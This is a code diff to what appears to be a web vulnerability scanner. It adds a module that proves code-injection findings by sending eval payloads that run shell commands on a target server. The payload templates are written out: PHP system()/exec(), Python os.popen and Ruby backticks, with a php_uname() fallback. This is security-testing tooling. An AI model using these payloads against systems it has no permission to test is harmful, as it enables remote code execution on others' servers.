@@ -18,6 +18,10 @@ finding stands exactly as it was.
   the *evaluated* output back (validated against ``uid=…``/kernel patterns, so a reflected literal
   doesn't count) — proof of OS command execution. Blind (OOB-only) cmdi returns nothing in-band, so
   it is left unproven rather than overclaimed.
+- **Code injection** — a direct ``eval()``/``assert()`` sink runs the whole value as code, so we
+  escalate the confirmed arithmetic to real execution: run a benign ``id``/``uname`` through a
+  language expression (PHP/Python/Ruby) and read the marker-bracketed output (RCE); if the runtime
+  blocks shell access, a language builtin (``php_uname()``) still proves arbitrary code execution.
 """
 
 from __future__ import annotations
@@ -54,10 +58,16 @@ async def prove_findings_impact(
     client: HttpClient,
     findings: list[Finding],
     *,
-    families: frozenset[str] = frozenset({"sqli", "lfi", "ssti", "cmdi"}),
+    families: frozenset[str] = frozenset({"sqli", "lfi", "ssti", "cmdi", "code-injection"}),
 ) -> int:
     """Enrich confirmed findings in place with proof of impact. Returns how many were enriched."""
-    provers = {"sqli": _prove_sqli, "lfi": _prove_lfi, "ssti": _prove_ssti, "cmdi": _prove_cmdi}
+    provers = {
+        "sqli": _prove_sqli,
+        "lfi": _prove_lfi,
+        "ssti": _prove_ssti,
+        "cmdi": _prove_cmdi,
+        "code-injection": _prove_code_injection,
+    }
     proven = 0
     for finding in findings:
         if finding.impact or finding.family not in families:
@@ -296,6 +306,67 @@ async def _prove_cmdi(client: HttpClient, finding: Finding) -> str | None:
                     f"Ejecución de comandos del sistema confirmada: `{label}` devolvió «{output}». "
                     "Demuestra que un atacante puede ejecutar comandos arbitrarios en el servidor (RCE)."
                 )
+    return None
+
+
+# --- Code injection (direct eval sink, CWE-94) → prove arbitrary code / OS command execution -----
+# The whole value is eval()'d, so a language-level expression runs. Try OS command execution first
+# (maximal impact: RCE); if the runtime blocks shell access, a language builtin still proves arbitrary
+# code execution. Output is bracketed by our delimiters and validated against real command output, so a
+# reflected literal never counts. Covers PHP (echo/return/statement contexts), Python and Ruby eval sinks.
+_CODE_EXEC_EXPRS: list[str] = [
+    "'{l}'.system('{cmd}').'{r}'",                          # PHP eval of an echo/return expression (bWAPP phpi)
+    "print('{l}'.system('{cmd}').'{r}')",                  # PHP eval of a bare statement
+    "'{l}'.exec('{cmd}').'{r}'",                            # PHP exec (last line)
+    "'{l}'+__import__('os').popen('{cmd}').read()+'{r}'",  # Python eval
+    "'{l}'+`{cmd}`+'{r}'",                                  # Ruby eval (backticks)
+]
+# (expression, pattern its output matches, label) — proves arbitrary code exec when the shell is locked down.
+_CODE_BUILTIN_EXPRS: list[tuple[str, str, str]] = [
+    ("'{l}'.php_uname().'{r}'", r"\b(Linux|Darwin|Windows|FreeBSD|SunOS)\b", "php_uname()"),
+    ("print('{l}'.php_uname().'{r}')", r"\b(Linux|Darwin|Windows|FreeBSD|SunOS)\b", "php_uname()"),
+]
+
+
+async def _prove_code_injection(client: HttpClient, finding: Finding) -> str | None:
+    """Escalate a confirmed direct-eval sink to proven execution: run a benign command (or a language
+    builtin) and read the evaluated, delimiter-bracketed output — never the reflected payload."""
+    point = finding.injection_point
+    if point.location not in _INJECTABLE:
+        return None
+    tok = secrets.token_hex(5)
+    left, right = "el" + tok, "er" + tok
+    budget = _MAX_REQ_PER_FINDING
+    # 1) OS command execution — the maximal impact (RCE).
+    for expr in _CODE_EXEC_EXPRS:
+        for cmd, pattern, label in _CMDI_PROBES:
+            if budget <= 0:
+                return None
+            budget -= 1
+            resp = await _send(client, build_mutated_request(point, expr.format(l=left, r=right, cmd=cmd)))
+            if resp is None:
+                continue
+            output = _extract_validated(resp.text, left, right, pattern)
+            if output:
+                return (
+                    f"Ejecución de comandos del sistema confirmada vía inyección de código (eval): "
+                    f"`{label}` devolvió «{output}». Un atacante ejecuta código y comandos arbitrarios "
+                    "en el servidor (RCE)."
+                )
+    # 2) Shell locked down? A language builtin still proves arbitrary code execution.
+    for expr, pattern, label in _CODE_BUILTIN_EXPRS:
+        if budget <= 0:
+            return None
+        budget -= 1
+        resp = await _send(client, build_mutated_request(point, expr.format(l=left, r=right)))
+        if resp is None:
+            continue
+        output = _extract_validated(resp.text, left, right, pattern)
+        if output:
+            return (
+                f"Ejecución de código arbitrario confirmada vía inyección de código (eval): {label} "
+                f"devolvió «{output}». Un atacante ejecuta código del lado servidor (posible RCE)."
+            )
     return None
 
 
